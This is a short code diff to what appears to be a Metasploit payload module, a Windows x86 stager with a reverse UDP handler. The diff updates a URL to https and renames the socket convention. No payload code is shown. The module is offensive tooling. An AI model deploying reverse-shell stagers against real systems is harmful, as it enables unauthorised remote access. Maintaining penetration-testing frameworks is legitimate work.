@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -27,7 +27,7 @@ module MetasploitModule
       'Platform'    => 'win',
       'Arch'        => ARCH_X86,
       'Handler'     => Msf::Handler::ReverseUdp,
-      'Convention'  => 'sockedi',
+      'Convention'  => 'udpsockedi',
       'Stager'      => { 'RequiresMidstager' => false }
     ))
   end
